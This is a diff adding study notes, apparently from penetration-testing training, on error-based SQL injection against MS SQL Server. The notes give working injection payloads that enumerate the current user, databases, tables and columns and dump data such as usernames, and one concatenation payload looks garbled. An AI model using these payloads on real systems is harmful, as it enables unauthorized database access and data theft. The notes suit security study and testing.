@@ -179,7 +179,75 @@ sample: after finding the in-band valid query, there's a way to validate the typ
 
 it will try to check for integer the first field. (if there's no error, it means the field is integer) the same process can be repeated to check for the field type.
 
+> error based explotation
 
+most of the times the error is reflected in the web application output, but could be also embedded in an email, appended to a log file, etc. 
+
+MS SQL Sever reveals the name of the database objects within error messages. 
+
+schemas are databases with the singular purpose of describing all the other user-defined databases in the system.
+
+"sa" is the superadmin for MS SQL Server and has access to the master database. master contains schemas of user defined databases.
+
+first thing to know: database version, that to build the exploits accordingly.
+most used trick is to "trigger a type conversion error" 
+payload for this technique:
+
+9999999 or 1 in (SELECT TOP 1 CAST (<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
+
+when we want the second select to be executed, it is needed that the first condition will be "false"
+
+the section "or 1 in" will help to trigger the error, with this command we are asking the database to look for integer value 1 within a varchar column. 
+
+...CASTING
+CAST (<FIELDNAME> as varchar(4096))
+the fieldname section is where we insert the column that we want to dump. either a column of a user-defined databse or a special database column). the fieldname can also be a SQL function, user_name() or a variable like @@version. (check pentest monkey cheat)
+
+find current databse user: if the user retrieved is not the admin user, we still can retrieve the databases owned by the same user. 
+
+9999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4086))) --
+
+retrieve databases: to do that, it is needed to iterate through the MASTER database to find all the databases that we can read. 
+
+payload:  9999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) -- 
+
+db_name() function, accesses the master..sysdatabases table which stores all the databases installed on the server. it will access the databases that the user founded has access. to enumerate all of them it is needed to increment the db_name() argument from 0 to X number until it is not more dbs.
+
+enumerate all tables in the current database or other databases:  
+payload:
+
+9999 or 1 in (SELECT TOP 1 CAST(name as varchar(4096))) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --
+
+xtype='U' = means that we are only interested in user-defined tables
+name NOT IN = name is a column of the "sysobjects" special table. every time we find a new table we will append it to the NOT IN list. needed because the error displays only the first table name
+
+enumerating the columns:
+
+payload: 
+9999 or 1 in (SELECT TOP 1 CAST (<database name>..syscolumns.name as varchar(4096)) FROM <database name>..syscolumns,<database name>..sysobjects WHERE <database name>..syscolumns.id=<database name>..sysobjects.id AND <database name>..sysobjects.name=<table name for analysis> AND <database name>..syscolumns.name NOT IN (<known column list>)); --
+
+<known column list> = means the list of the columns we already retrieved
+
+dumping
+
+dump the data doing schema enumeration
+payload:
+
+9999 or 1 in (SELECT TOP 1 CAST (<column name> as varchar(4096)) FROM <db name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
+
+to force or ensure the selected parameter has data type "varchar" exist a trick to add a concatenation: 2%bchar(64) | 2%b
+
+payload: this payload will help to force the error (values: id, cms, users)
+
+9999 or 1 in (SELECT TOP 1 CAST (id as varchar)%2char(64) FROM cms..users WHERE id NOT IN ('')); -- -
+
+-> %2b = it means to sent the value/symbol + to the DBMS, the character "+" means concatenation.
+
+getting all ID's now, the other columns can be extracted, for example, "users"
+
+9999 or 1 in (SELECT TOP 1 CAST (username as varchar) FROM cms..users WHERE id=1); -- -
+
+9999 or 1 in (SELECT TOP 1 CAST ("column name" as varchar) FROM cms..users WHERE id=1); -- -
 
 
 
